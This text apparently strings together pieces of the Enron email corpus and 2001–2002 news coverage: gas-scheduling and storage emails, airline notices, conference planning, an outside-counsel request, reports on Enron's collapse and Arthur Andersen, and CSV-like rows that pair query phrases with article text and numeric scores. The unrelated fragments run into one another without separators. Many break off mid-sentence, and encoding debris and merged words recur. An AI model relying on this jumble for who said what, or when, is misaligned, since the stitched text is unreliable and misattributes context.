Enron and you made millions out of the pocketbooks of California consumers and from the efforts of your employees.Mr. Lay, your wife said that ""you were devastated"" by the collapse of Enron. Are you ""devasted"" enough to return some of the hundreds of millions you made wheeling and dealing in Enron stock--and your salary! Perhaps from the millions you will receive from your property in Aspen and elsewhere you'll find a few scheckles to do the right thing.Indeed, while you netted well over a $100 million, many of Enron's employees were financially devastated when the company declared bankruptcy and their retirement plans were wiped out. And Enron made an astronomical profit during the California energy crisis last year. As a result, there are thousands of consumers who are unable to pay their basic energy bills and the largest utility in the state is bankrupt.The New York Times reported that you sold $101 million worth of Enron stock while aggressively urging the company's employees to keep buying it.

CONTINENTAL AND CONTINENTAL EXPRESS 
TO REINFORCE COCKPIT DOORS

HOUSTON, October 3, 2001 -- Continental Airlines (NYSE: CAL) and its
regional air carrier Continental Express (NYSE: CAL) will begin immediate
installation of secondary reinforcing restraints on cockpit doors to enhance
security on their aircraft, pending receipt of Federal Aviation
Administration (FAA) final criteria specifications. With approval, the
airlines plan to complete installation on all of Continental's 341 aircraft
and Continental Express' 160 aircraft within 30 days. 


THE MOVE IS ON
Houston's Paris, London and Tokyo Flights Check-in at Terminal C

What: Terminal change for flight check-in 
Flights affected: Continental flights from Houston to London, Paris and
Tokyo 

Effective October 16, 2001, passengers traveling on Continental from Houston
to London, Paris and Tokyo will check-in at Terminal C in George Bush
Intercontinental Airport (IAH). There will no longer be any passenger
check-in facilities in Terminal D. Moving the check-in of these flights to

for feb,

VPP gas: sitara tic #541136 shows 11,136/d, when it should really be 11,480/d.

The other 344/d is on sitara tic #555941; the two tickets together total 
11,480/d.  You'll remember that the Bank of America tics were established by 
John Griffith's team.

and re the excess gas tics [below], they do not match my first of the month 
[FOM] info below.  Did the FOM change?  

The nom was in fact changed by Hunt at 2:00 pm on 1/31/2001.  Hunt had 
inadvertantly provided you with North Central's nomination for the low volume 
meter, 9502, instead of Preston's nomination.  Thus, the 2,997/d on the North 
Central page (note the 25% WI on your original documentation - I missed this 
clue also) provided to us on 1/25/2001 became 2,012/d on the Preston page 
provided to us on 1/31/2001.

Yes. I have been monitoring BP's FDD balance. Sherry and Chris have been working with someone at BP, filling in for the regular vacationing BP scheduler, and who is unfamiliar with FDD service. Chris and Sherry have taken the over scheduled FDD and rescheduled it into BP's IDD account. Currently BP's FDD is within contract parameters and I will continue to monitor all FDD balances.

Subject:	FDD Status for Dec 19th, 2001

Attached is the latest FDD status report as of December 19th.

Tabs showing FDD activity for this time period for the last three years is also included.


The GIP contracts should be at 89.90% to be on target to get to the max allowable contract quantity for the end of December.  The max target amount for GIP accounts by the end of December is 83.5%.  The average remaining balance for all GIP contracts is 95%.  To get to the tariff limit of 83.5% by Jan 1st, the GIP contracts will have to withdrawal about 1.8 Bcf, or 150 mmcfd, over the next 12 days.

The 3-step & 4-step do not have a minimum requirement to be met by the end of December since minimum withdrawals for Nov/Dec is zero.

The last report stated that Entergy-Koch had switched to GIP from 4-step.  This was in error.  They are still in the 4-step process.

BP Canada has injected 101.16% of their contract amount.  They have 2,125,406 of GIP on a contract of 2,100,932.

The percentage break out by service is GIP - 34.5%, 4-Step - 45.9%, and 3-Step - 19.5%.

Overall FDD is 94.36% full.

If you have any questions, please call me.

I would like to confirm the dates of some of the  forthcoming EPRM events:
?
Effective VaR and stress testing  techniques for the US energy industry. This 
event will run on the  21 & 22 May in London and the 28 & 29 May in Houston. 
Michele Du  Berry (Director of Conferences) and I are looking at how we have  
structured the training courses and are keen to present a different  outline 
than on previous courses. I would like to run this event with 2-3  trainers 
per venue, rather than with 7-8 as we have done in the past. If  you and Les 
Clewlow would be interested in leading this course (possible  with Vince 
Kaminski) I would be delighted to discuss the event in greater  detail.

scheduled to between  September 19-21. Victoria Kerridge will be producing 
this event from the  London office and will be starting research in two 
weeks. I am going to be  providing her with a brief and will ensure that she 
has your contact  details.

I have also been finalizing the details for the  annual Energy & Power Risk 
Management event in Houston. This will take  place on May 14th & 15th and is 
close to completion. I would be happy  to provide you with more details, 
without potentially running the risk of  overloading your schedule with a 
number of events in a short space of time  (VaR and EPRM, Houston). My

     The report said investigators were told ``by more than one person that the company spent considerable time and effort working to say as little as possible'' in documents about transactions with related parties that proved to be Enron's downfall. That ""should have raised red flags for senior management, as well as for Enron's outside auditors and lawyers,'' the report said.
     Hollings said Enron's ties the administration -- Lay was a longtime contributor to Bush's political campaigns and other administration members had business ties to the company - showed the need for a special prosecutor to head the criminal investigation into Enron's collapse.
     ""I've never seen a better example of cash-and-carry government than this Bush administration and Enron,'' Hollings said.
     Bryan Sierra, a spokesman for the Justice Department, refused to comment on Hollings' proposal.



Senate to subpoena Enron's Lay
Lawmakers intent on digging up facts behind Enron's collapse

Sixteen hours before he was to testify under oath, former Enron CEO Ken Lay abruptly cancels his plans to testify before a Senate committee. NBC News correspondent Lisa Myers reports.

By Brock N. Meeks
MSNBC, 02/04/2002

Feb. 4 -  The Senate Commerce Committee will issue a subpoena to compel former Enron CEO Kenneth Lay to appear before the panel, Sen. Byron Dorgan, (D-N.D.), said Monday. The move comes as a direct result of Lay's 11th hour refusal to testify before Congress Monday, raising the ire of lawmakers intent on unearthing the details behind the biggest financial collapse of a single company in U.S. history. Committees in the House also are working on issuing a subpoena to force Lay to appear, sources told MSNBC.com.

       LATE SUNDAY, LAY'S lawyer informed House and Senate committees expecting Lay to testify on Monday that he had changed his mind. 
       ""I have instructed Mr. Lay to withdraw his prior acceptance of your invitation,"" Lay's attorney, Earl Silbert, wrote to committee chairmen. Lay had intended on testifying without any grant of immunity, a move that left defense attorneys scratching their heads, especially in such a potentially inflammatory hearing as Enron.
       It was just that atmosphere, apparently, that moved Lay to withdraw from appearing on Monday.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"WASHINGTON, Oct 16 (Reuters) - Enron Corp. on Tuesday reported its first loss in more than four years after taking $1.01 billion in charges on ill-fated investments, including water and telecommunications services, which it said have clouded the strength of its core energy businesses. Enron, North America's biggest marketer and trader of natural gas and power, said the charges were an attempt to put its house in order after a tumultuous year in which a new chief executive suddenly resigned and the company's stock lost two-thirds of its value as once enthusiastic investors lost faith in the company.""What we've tried to do here is clean up anything that we thought needed cleaning up to get these distractions out of the way,"" Chief Executive Officer Ken Lay said in a conference call. Lay reassumed the CEO mantle at Enron after his successor, Jeff Skilling, resigned in August after only six months at the helm. Houston-based Enron reported a third-quarter net loss of $638 million, or 84 cents a share, compared with net income of $271 million, or 34 cents a share, in the same period of 2000. It was Enron's first loss since the second quarter of 1997. The charges covered the company's loss-making broadband telecommunications business, its troubled water affiliate Azurix, and New Power Co., Enron's retail electricity joint-venture with AOL/Time Warner and IBM. Commerzbank Securities analyst Andre Meade said it would probably take Enron a few more quarters to rebuild confidence in the company which was a Wall Street favorite just 12 months ago. ""They do a couple of things very well and if they stick to their knitting, they're a solid company, but they have stumbled when they strayed further afield,"" said Meade. Enron's stock closed 67 cents higher at $33.84 on Tuesday, but for the year it is down about 59 percent, underperforming the Standard & Poor's utilities index .SPU), which has fallen some 23 percent over the same period. ILL-FATED BUSINESSES Originally a natural gas pipeline operator, Enron seized on opportunities created by the deregulation of U.S. energy markets to become the nation's dominant wholesale marketer and trader of natural gas and electricity. The company moved into the water services business in 1998 by acquiring Britain's Wessex Water and forming Azurix, a unit which Enron took public in 1999 but had to buy back this year after it failed to meet performance targets and its stock price tumbled. Enron helped set up New Power Co. and take it public last year but its stock has since fallen from about $28 per share to less than $2 as companies have found it hard to make a profit in deregulated U.S. residential electricity markets. Enron also launched a broadband telecommunications business last year, predicting that network capacity would one day be traded like natural gas or electricity, but it has recently admitted that it overestimated the market's early potential.",0.0,0.0,0.8,0.2

Florida

Mark,

I have a unique outside counsel request on which I'd like your approval.  I 
am involved with a potential power plant development project with the 
Seminole Indian Tribe of Florida.  The project would be on their land and 
would potentially involve a joint venture with them.  Although we are at a 
preliminary stage, even the initial letter of intent that we are negotiating 
raises unique issues that will set the precedent for our project development 
agreements with respect to enforceability, jurisdiction and dispute 
resolution matters.  

I have identified and spoken with Lynn Slade of the New Mexico law firm of 
Modrall, Sperling, Roehl, Harris & Sisk on whether he could advise us on the 
Indian law issues associated with this project.  Lynn and several of his 
colleagues specialize on Indian law matters, and Lynn has experience both 
with representing Enron and in handling energy transactions in general.  In 
fact, Lynn gave a presentation at the 1999 Enron law conference entitled 
""Energy Business in 'Indian Country': Opportunities and Obstacles"" (credit 
goes to Jeff Hodge for remembering that presentation and suggesting I contact 
Lynn); Lynn has represented several of Enron's pipeline companies, as well as 
the government affairs department, in connection with their Indian law issues 
and, at one time, prepared an opinion letter for ENA in a transaction 
involving the Ute tribe.  

Lastly, please note that I had asked our Florida counsel of Greenberg Trauig 
on whether they had any Indian law expertise, including specifically, any 
experience involving the Seminoles.  Unfortunately, the Seminoles are one of 
their clients so Greenberg cannot represent us in a manner adverse to the 
Tribe.  

Thanks in advance for your attention and consideration of this request.

It will help them compete on equal terms for global capital,""Bolkestein said. He added that the legislation would require companies tobegin preparing their consolidated accounts using IAS by 2005.Bolkestein also said he is hopeful that the U.S. Securities and ExchangeCommission will begin to accept financial statements prepared by firms inthe European Union without requiring them to be reconciled with thegenerally accepted accounting principles (GAAP) standard used in the UnitedStates.A major reason that changes are needed in the European Union's financialregulations is because of the ""unprecedented volume of mergers andacquisitions"" between American and European firms.Another reason is that the European Union has established a goal of becoming""the most competitive and dynamic knowledge-based economy in the world,capable of sustainable growth with more and better jobs, and greater socialcohesion,"" Bolkestein said.Since 1990, Bolkestein said the European community has added 900,000 jobsand has seen improved competition and productivity add 1.5 percent to grossdomestic product growth because of measures taken to create a single marketfor financial services.If the European Union is successful at restructuring its financial system by2005, Bolkestein said he sees other benefits to include a lower cost ofcapital for all companies, a deeper and more vibrant venture capital market,lower costs of purchasing financial products, and higher returns on pensionsand investment funds.To realize those benefits, Bolkestein said the European Commission wouldlike to see an integrated securities market in place by 2003, replacing theindividual domestic securities markets of the European Union's 15 memberstates.""Mergers and alliances between existing exchanges are already breaking downbarriers, pooling liquidity, reducing clearing costs, decreasing volatility,and increasing transparency,"" Bolkestein said.

Subject:	RE: NNG/Utilcorp $100,000 a month Reserve

I have looked at the Utilicorp reserve, spoken with the Marketing account manager and would like to propose the following:  

Facts:
?	As of August 2001, there is $1.0 million in the reserve account.  
?	The contractual obligation to pay UCU $1.2 million for 2001 can be offset by a $.7million ""credit"" for value given to UCU by NNG Marketing during the year. Thus the amount to be paid to UCU in October would be $.5 million.  
?	The Third Current Estimate now assumes a $.6 million payment..  Reserves are not needed to meet Third Current Estimate.
?	UCU has expressed an interest in banking the $.7million credit from 2001 to 2002 

Recommendation:
?	Defer $.7 million 2001 credit to 2002 - (negotiate time value appropriately)
?	Pay $1.2 million in October 2001(4th quarter)
?	Reverse $1.0 reserve in September (3rd quarter), as it is not longer needed to meet Third Current Estimate.
?	Upside from 3rd Current Estimate 2001 is $.4million. (for the year).
?	No further reserve entries are necessary going forward.

Standard & Poor's Risk Solutions and Risk Data Bank to develop a scoring model for Japanese SME's
 
Standard & Poor's Risk Solutions today announced that it has formed a strategic alliance with The Risk Data Bank of Japan Limited (RDB), a leading provider of credit risk data, to jointly develop the first advanced scoring model to assess the creditworthiness of Japanese small and medium-sized enterprises (SMEs).
 
The advanced scoring model will be fully developed by June 2002 and will leverage Standard & Poor's analytic strength and global credit experience, and RDB's comprehensive database of financial information and robust default data.
 
As a membership organization, RDB has, to date, operated by aggregating financial and company data on SMEs gathered from its 38 member institutions. Member banks in turn, gain access to RDB's database and scoring models, and use the information to internally rate the financial positions of unlisted companies. 
 
Standard & Poor's and RDB will work together to further develop the scoring model, as well as collaborate to improve the quality of recovery data and develop analytics for a recovery rate estimation model.

mark to market accounting practices,1,"This is more than an academic argument. Supporters of fair value accountingsay the existing state of affairs masks the real financial position of banks- one reason why banks are often given lower stock market ratings thansecurities houses which mark their loans to market. Opponents say thevolatility of fair value accounting would not only confuse consumers andinvestors, it could lead banks to withdraw from lending that causedvolatility even though it was safe. At worst, the result would be to amplifythe economic cycle, with sudden withdrawals of credit accentuating thedownturn when markets slow.The issue is further complicated by the continuing internationalnegotiations over the amount of capital banks have to hold. The new Basleaccord would base capital requirements on risk assessments rather thanmarket pricing, leading some bankers to fear a divergence between the Basleformula and accounting standards. It is impossible to argue against greatertransparency in bank accounting but it should be recognised that there ismore than one way to capture financial reality. Much more work is neededbefore fair value accounting can be proclaimed as the right answer forbanks.IASB Taking Tentative Steps on Agenda With Help From National RulemakingGroupsBNA - May 29, 2001By Steve BurkholderLONDON--The International Accounting Standards Board took more steps May 25to set its rulemaking agenda, placing fast-track efforts to improve existingstandards and to ease companies' switching to international rules at thefront of a long docket.The steps are tentative, however. Under its constitution, IASB must consultwith its advisory council--which is yet to be named--before it can formallyfix an agenda. A meeting with the advisory panel is expected to take placein July. The improvements project is an omnibus effort intended to mend avariety of rules IASB inherited from its predecessor board, theInternational Accounting Standards Committee, and to rid those standards ofinconsistencies and inappropriate choices in accounting methods.The transition, or first-time application, project is being watched closelyby the Big 5 accounting firms and their European client-companies. Thataudience is mindful of the planned European Union directive that wouldrequire some 7,000 companies in the region to carry out their financialreporting using international standards by 2005.",0.0,0.3,0.8,0.2

pursue.  But today he sounded a different note.  ""It really
stresses me that we don't have a more coherent, cognizant vision of
what we're doing here,"" he said.  ""We're just running around
reacting to the latest"" issues.  The initial work to act on his
agenda will be started within six months and will be ""substantially

Various proceedings will be used to address his agenda, he said.=20

said, ""the agency gets machine-gunned"" with petitions and other

Regarding broadband services, Mr. Powell stressed the importance of
limiting regulations that inhibit deployment.  ""It is clear that
substantial investment is required to build out the new networks,
and we should limit regulatory costs and regulatory uncertainty,""
he said.  ""Our focus should be on demonstrable and competitive
risks and discriminatory provisioning.""

will ""clarify regulatory classification and access obligations

focus on broadband services:  (1) the ongoing new networks pro-

In Novem=ber, Mr. Lay told Chuck Watson, the chairman of Dynegy, which at the time h=ad agreed to buy Enron, that he had never fully read the financial statemen=ts Enron filed with federal regulators, according to Mr. Watson.But if Mr. Lay's comments left the impression that he was a hands-off chair=man, a different picture has emerged over the last 10 days as to what Mr. L=ay knew about the company's accounting practices and when he knew it.=20Disclosures by Congressional investigators and lawyers suing Enron showed t=hat Mr. Lay helped create and oversee some of the company's suspect financi=al arrangements. He knew that doubts had been raised about Enron's accounti=ng, even as he encouraged employees to buy Enron shares.

Imagine the headache Enron Corp. is facing. On Thursday, the company admitted it's found a few errors, too -- close to $600 million in mistakes spread over the past 4 1/2 years. The energy giant said it is restating its finances as far back as 1997 to account for losses related to a number of complex partnerships, including several under investigation by the Securities and Exchange Commission. This includes a $586 million reduction in net income, an additional $2.5 billion in debt and a 77-cent reduction in earnings per share. Enron also said it has fired a number of employees who invested directly in the partnerships and is investigating if others had improper dealings. The announcements came on the same day the company confirmed it was in negotiations to merge with cross-street rival Dynegy Corp. Directors with both companies have been in round-the-clock meetings in recent days, hammering out a deal. The revelations, outlined in a document Enron filed with the SEC Thursday morning, shine a bit of light onto issues that for weeks have been cloaked in shadows and out of sight of Wall Street analysts and investors. That includes investment partnerships that led to a $1.2 billion loss for the company last quarter, as well as other deals formed by the company's former chief financial officer that may have been a conflict of interest. The company's reluctance to share detailed information on the partnerships since they first arose last month left many to assume the worst. Enron's stock price plummeted, credit agencies slashed its ratings and trading partners began to shop their business around to competitors. Enron chief executive Ken Lay said the release of information was aimed to calm the concerns of shareholders and federal investigators. For all practical purposes it came too late. ""At the end of the day these details give support to the fear that Enron was a financial house of cards,"" said John Olson, an analyst with Sanders Morris Harris. ""It would make a good case study on what happens when you fly too close to the sun."" The turmoil started shortly after Oct. 16, when steep losses in Enron's third-quarter earnings drew renewed attention to a pair of investment partnerships created by former CFO Andy Fastow with the approval of the company's board of directors. The partnerships, called LJM1 and LJM2, were formed using Enron equity and outside capital as a way to hedge against the risks involved in some of the company's new lines of business, such as Internet broadband trading and water. They were also designed to help the company grow quickly without adding too much debt to its books or diluting the value of the company's stock.",0.0,0.0,0.9,0.2

However, thecompany's highly favorable valuation should provide enough buoyancy toprevent much more stock-price erosion. With a market capitalization of$218 million, Cheap Tickets is valued at 0.5x trailing 12 months' revenueof $416.5 million. That's the best revenue-multiple valuation I've everseen among profitable Internet companies.Of course, as mentioned earlier, Cheap Tickets really isn't a pureInternet play. Begun in 1986, the company's prime business - whichaccounts for 94% of sales - is to purchase non-published air fares fromthe carriers and re-sell them at a discount to consumers. Up until 1997,all of its sales came through four call centers and a dozen retailoutlets.This changed in 1997, when CTIX launched its cheaptickets.com Web site. Bylast year's third quarter, 27% of sales came via the Internet. Thatincreased to 37.4%, or $45.4 million, in the recent third quarter.Further, while Internet-based revenues are rising both on a dollar andpercentage basis, call center and retail revenues actually are decliningon a dollar basis as the company focuses more on the Web, a strategy shiftthat has been accompanied by higher gross margins.All of the above are good reasons to expect CTIX shares to rise. Nowhere's why I don't expect them to rise too far.",0.0,0.0,0.7,0.0

The question posed was whether a company can report profits made by one subsidiary while ignoring the losses of the other one. That company may or may not be Enron.

Business; Financial DeskAccounting Firm Fine a Record Probe: Arthur Andersen agrees to pay $7 million civil penalty in case involving audits of Waste Management.From Reuters06/20/2001Los Angeles Times Home EditionC-3Copyright 2001 / The Times Mirror Company WASHINGTON -- Accounting giant Arthur Andersen agreed to pay $7 million to settle charges it filed false and misleading audit reports of Waste Management Inc. in which the No. 1 U.S. trash-hauler overstated income by more than $1 billion, federal regulators said Tuesday. The fine was the largest-ever civil penalty against a Big 5 accounting firm, said the Securities and Exchange Commission in announcing the settlement against Arthur Andersen and four of its current or former partners.Publicly traded companies are required to hire an accounting firm to go over books using generally accepted accounting principles. The firms are supposed to raise any concerns with management and issue opinions about the audits. Arthur Andersen, which did not admit or deny the SEC charges, examined Waste Management's books from 1992 through 1996, and issued audit reports that falsely claimed that the statements had been prepared using generally accepted standards, the SEC said. The agency added that the Waste Management financial statements that Arthur Andersen blessed had overstated the Houston-based trash company's pretax income by more than $1 billion. ""Arthur Andersen and its partners failed to stand up to company management and thereby betrayed their ultimate allegiance to Waste Management's shareholders and the investing public,"" said Richard Walker, the SEC's top cop. In addition to the $7-million fine, Arthur Andersen agreed to what the SEC said was the first anti-fraud injunction in more than 20 years against an accounting giant. It also agreed to be censured. ""This settlement allows the firm and its partners to close a very difficult chapter and move on,"" Chicago-based Arthur Andersen said in a statement. ""The allegations underlying the settlement are limited to one client and reflect work that is in some cases more than seven years old,"" it added. Arthur Andersen has served as Waste Management's auditors since before it became a public company in 1971. The company merged in 1998 with USA Waste Services Inc., and the surviving entity took the Waste Management name. Arthur Andersen still audits its books, a Waste Management spokeswoman said. The company said in a statement that Tuesday's settlement stemmed from an SEC investigation of the ""old"" Waste Management's 1998 restatement of annual financial documents from 1993 through 1996 that were audited by Arthur Andersen.Business; Financial DeskBRIEFLY / ACCOUNTING Andersen to Settle Sunbeam Shareholders' SuitAssociated Press05/02/2001Los Angeles Times Home EditionC-4Copyright 2001 / The Times Mirror Company",0.0,0.0,0.9,0.6

It's an excerpt from an analyst's noteout this AM.A Perspective: R.I.P. Enron:It took sixteen years to build Enron into a $63 billion asset powerhouse,but only 24 days for it to disintegrate.The fatal flaw was the aggressive accounting and leveraging done in variousoff balance sheet partnerships (Special Purpose Entities), which apparentlybecame too aggressive to fully disclose. Wall Street had no idea of their holdings,their leverage or their derivative exposures. The SPEs mutated intosomething beyond the pale, becoming a company within a company. This evidently began30 months ago when the new management regime (Skilling, Fastow, et al)sanctioned their evolution. Make no mistake: they were cleverly contrived. Theyinvolved conventional asset & debt transfers off the books, coupled with fair value(asset mark-to-market) accounting and synthetic equity financing. Thisallowed for considerable earnings management and the appearance of cost-free equity.If nothing else, they now appear in hindsight to have been vanity deals: veryNew Economy, very Virtual and very aggressive. But no clients ever complained,to our knowledge. Yet ENE clearly crossed the GAAP reporting lines, as thelatest 8-K attests, and the dual role of the CFO (sitting on both sides of thetable in the LJM transactions), profiting highly in the process, created in the LJMpartnership natural conflicts of interest now being investigated by the SEC.Because of this elementary mistake in any seasoned judgment, which passedmuster at every level, the most successful energy company of the 90s was vaporizedin the marketplace. The main thing that brought ENE down was hubris. It hadused up all of its credibility when the partnerships were brought to light. If thesewere fully revealed two years ago, a collapse would have been very unlikely.Rob LloydAIM Management",0.6,0.5,0.9,0.6

House Panel May Subpoena Testimony from Enron's Lay

Of DOW JONES NEWSWIRES 

WASHINGTON -(Dow Jones)- A House Financial Services subcommittee voted Monday to authorize issuing a subpoena Enron Corp.'s (ENRNQ) former Chief Executive Kenneth Lay.
Lay was to have testified to the House panel Tuesday, but canceled abruptly, saying it appeared lawmakers had already made up their minds in advance of his appearance. 
Lawmakers, including Rep. Michael Oxley, R-Ohio and Rep. Richard Baker, R-La., said a decision on whether to subpoena Lay would be made shortly. 
The House panel, chaired by Baker, kicked off a hearing into Enron on Monday with testimony from Securities and Exchange Commission Chairman Harvey Pitt. 
Pitt's testimony came after partisan wrangling about whether he should take a sworn oath. Republicans said there were no suggestions Pitt would lie, but Democrats insisted on a vote on the matter, which passed narrowly. 
Pitt said he had no problem taking the oath.

I don't want to post an advetisement only I want them to post the turbines themselves. So essentially just like a new product launch we would have a pop up announcing a new product and the new product would be our turbines - exactly the same as any other product. They have to post the turbines out there and obviously there will only be an offer and they will be for the ABBs we actually have in Canada. You never know someone may click - it would be an interesting concept and probably non-binding as there would be site inspections etc.But not an advert - actually posting the turbines.Louise -----Original Message-----Subject:RE: eNYMEXBob Shults and I will be attending an eNYMEX reception this Thursday, and John and Greg are still trying to coordinate a meeting with Bo and Vincent. Short answer-- we've got it as covered as possible for now. Another item: I got a call from Stephen Thome in ENA who wanted us to post something like an advertisement for your turbines on EnronOnline. Jay confirmed that it was technically feasible to craft a pop-up that targets certain customers with information and links to documents and spec sheets. I'm told we have resisted this approach in the past because it has the potential to get out of hand once the genie gets out of the bottle, so to speak.

mark to market accounting practices,0,"For more than a year, accounting for loan loss allowances has been a hottopic among banks, their federal regulators, standard-setters at theAmerican Institute of Certified Public Accountants, accountants at theSecurities and Exchange Commission, and--so far peripherally, butsignificantly--FASB.The SEC was not mentioned in the verbal sparring between FASB members anddelegates from the Independent Community Bankers of America (ICBA). However,it was SEC Chairman Arthur Levitt's comments in late 1998 about loan lossallowances that sparked the wider debate in industry, public accounting, andamong regulators.Levitt cited loan loss accounting as one way by which corporate earningsreports--in this case, those of banks--can be manipulated through use ofso-called ""cookie jar reserves."" That view led in large part to a publicdebate between the commission and the banking agencies, including the Officeof the Comptroller of the Currency and the Federal Reserve Board, andcarefully crafted interagency statements offered from Washington to calmbankers.Doubts About Utility of Fair Value AccountingSeparately at the meeting with FASB, representatives of the communitybankers group voiced doubts about the utility of moving to fair value-basedaccounting for all financial assets and financial liabilities, and moredebate ensued. The accounting board has embarked on a rulemaking projectthat would lead to a goal of full fair value accounting for financialinstruments, provided difficultmeasurement questions can be answered. That effort is expected to lastyears.""As a user"" of financial statements, ""I'd rather have cost-based amounts infinancial statements,"" said Kurt Henstorf, of First National Bank,headquartered south of Omaha, Neb.""I totally disagree,"" said FASB's Foster. His view was buttressed bycomments from Lucas, who said, as an auditor, he would rather seek to checkfair value-based amounts for banks' loans that depend on current accountingfor bad debt reserves. Henstorf disputed that.The board's staff project manager of the fair value effort, Ronald Lott,offered an anecdote that counters a refrain sounded by the bankingcommunity--that security analysts are not clamoring for fair values infinancial statements. Lott said he took part in a recent panel discussion inwhich analysts appeared to voice a desire for more fair value-basedinformation. ""They seem very interested in fair value,"" said Lott. ""Theyjust didn't trust what's in the financial statements.""Near the end of the discussion on fair value, Foster offered a predictionabout the length of FASB's rulemaking project. He ventured that hiscolleagues would not disagree.Looking at the gathered bankers, Foster said, ""All of you will be retired bythe time this goes through.""American Banker, 9/27/00Armey Pushes for Compromise on SwapsBy Rob Garver",0.0,0.0,0.8,0.2

mark to market losses,0,"The Wall Street Journal Online Blue-chip stocks sank Wednesday, after a key survey of regional conditions from the Federal Reserve revealed that many sectors of the U.S. economy continued to struggle.Investors also were rattled by news that Dynegy had pulled out of merger talks with energy-trading giant Enron. In 4 p.m. trading in New York, the Dow Jones Industrial Average was down 160.74 points to 9711.86, after flirting with a return to 10000 over the last two sessions. The industrials finished down 110.15 points, or 1.1%, at 9872.60 Tuesday. Meanwhile, the Nasdaq Composite Index lost 48 to 1887.97, after declining 5.26 points to 1935.97 Tuesday. Other indexes also fell. The Standard & Poor's 500-stock index dropped 20.98 to 1128.52, the Russell 2000 Index declined 7.01 to 453.70, and the New York Stock Exchange Composite Index lost 9.33 at 575.25. Investors were caught off guard Wednesday after Standard & Poor's Ratings Group downgraded Enron's debt to junk status, a move that was immediately followed by word that prospective suitor Dynegy had called off its agreement to merge with the struggling energy company. The downgrade triggered financial covenants and raised the possibility that Enron will be forced to file for protection under Chapter 11 of the federal bankruptcy code. Shares of Enron tumbled $3.50, or 85%, to 61 cents in composite trading at 4 p.m. EST. On the New York Stock Exchange alone, 181.9 million Enron shares traded hands, setting a Big Board volume record. Dynegy lost $4.92, or 12%, to end at $35.97. The news hit shares of other energy-trading companies, including El Paso Corp., which skidded $3.59, or 7.4%, to $44.91, and Williams Cos., lost $1.80, or 6.2%, to 27.05%. Meanwhile, the Fed's so-called beige book survey of regional economic conditions indicated the economy remained soft in October and November. The report showed ""signs of further slowing outweighed signs of recovery"" in early November, indicated that production declined at American factories, and said that airlines and hotels struggled with a sharp drop-off in travel. The Fed also found ""evidence of additional slowing in most regions"" which outweighed the faint signs of recovery reported by a few Fed districts. The report rekindled speculation that the Fed will reduce interest rates again in an effort to stimulate the economy. Investors already had been in the mood to take some money off the table, a trend that started Tuesday after the Conference Board issued a disappointing report on consumer confidence, and Federal Reserve Gov. Laurence Meyer said it is likely that U.S. economic output is continuing to shrink. Indeed, market analysts said the Fed survey wasn't a surprise, and instead are trying to anticipate when the news will get better. Alfred Goldman, chief market strategist at A.G. Edwards & Sons, said the market was due to correct itself after an ""uninterrupted up move"" since the Sept. 11 terrorist attacks.",0.0,0.0,0.0,0.0

Enron used derivatives -- financial instruments such asfutures and options whose value is based on other assets -- toinsure against price swings or take bets on a price's direction.The Houston-based company had revenue of $1.9 billion fromderivatives trading last year, more than double the $765 millionin 1999, making it one of the largest traders, according to SwapsMonitor Publications Inc. By comparison, Williams Cos., the No. 2 U.S. natural-gaspipeline owner, had revenue of $1.29 billion on derivativestrading in 2000. Paul Spraos, president of Swaps Monitor, a research companythat compiles trading figures, said Enron only posts derivativesstatistics once a year so there are no figures for 2001. Dynegy Inc. abandoned its planned merger with Enron onWednesday, leaving it with more than $15 billion of debt and thepossibility of bankruptcy. As well as oil and gas futures, Enrontrades derivatives based on such things as weather and information-transmission capacity, known as bandwidth. Banned From Trading Spraos estimates that as of Sept. 30, Enron owed $18.7billion on derivatives trades that went sour, though he said thatdoesn't take into account the collateral Enron probably posted toback up the trades. The European Energy Exchange today banned Enron from tradingits products, while Australian regulators barred the company'sfinance unit, Enron Australia Pty, from trading electricityfutures because its funding wasn't assured. U.S. Senate and House committees will investigate Enron'sdecline and consider new regulations for electricity and natural-gas trading. The Securities and Exchange Commission is alsoexamining the company. Enron had $201 billion worth of derivatives on oil, gas andelectricity at the end of last year, Swaps Monitor has reported.That's measuring the notional amount, the face value of thesecurities on which the derivatives are based. `Quantifying It' ``Everyone will be looking at their exposure, whether they'vegot collateral, and quantifying it,'' said Robert G. Pickel, chiefexecutive officer of the International Swaps and DerivativesAssociation.

raptor creation of special purpose entities,0,"Subject: GE LanguageTeam Enron - I spoke with Lisa this morning regarding her comments to the GE language, the substance of which follows. I can discuss this on the call with GE, but I wanted the Enron participants to know what our issues are. 1) Assignment - Generally, if GE is going to require that we list all the possible assignees, the list should be broad enough to encompass the possibilities. The comments below are designed to help make the language as broad and flexible as possible. It would be best if we did not have to list them. A. 22.2(iii) and (iv) - we need to make sure that the definition of ""Facility"" will be generic enough to cover any facility, not merely the one(s) which may be the subject of the particular agreement - also generally we will need to vet any defined term used in our sections to make sure it does not result in greater restriction than we planned ; B. I think we can remove the bracket before 22.2 (iii)(2) and add ""Purchaser"" to the list of folks who can agree to ""convey a power plant project."" Also in that clause, we will need to confirm required ""timing"" of some power plant project development - does it mean only at the time of signing the agreement? It should be for any power plant project in development either at the time of signing the agreement, or any project in development in the future. Insert the number 3 before the last ""and"" in 22.2(iii); C. The paragraph following 22.2(iv)(c) has references to ""(v) and (vi)"" above, which are no longer in the list;  D. The bold and bracketed language indicates that the terms of each of the ""Facility Agreements"" should be in ""strict conformity"" with the Ts and Cs of ""this Agreement."" Although it is written in the context that there has been an assignment, Lisa wants to make sure that there is no expectation on GE's part that an Enron entity will necessarily remain as the ""Agent."" Also, the language indicates that the assignee and the vendor will enter into an indemnity provision in the Facility Agreement that is in accordance with Exhibit E (last sentence). Does this still work given that the indemnity now runs only to the Purchaser? 2) Limitation of Liability - 27.2 and 27.3 We may need to explain to the Enron accountants and AA that the reference to ""indemnity"" in these sections does not create a separate indemnity obligation on Enron's or WLB's part. 3) Is the phrase ""cognizant government"" in 20.2(b) meant to apply to a governing body with jurisdiction over the Seller and/or Purchaser?

Security access for the ""Estate"" will be the same as Production currently is.
Access for ""Netco"" will have to be set up from scratch.
Can each of you give me a list of the people that should have access to  ""Netco"".
Access is still preliminarily being set up on a West, East, Central and Texas regional basis.
Included in the list should be Risk, Logistics, Trading and anyone else that you know of that you want to have access to your region..

The plan is to have a large mass set up,  additional updates will be handled under eRequest, under the new application region code ""Houston - Netco""

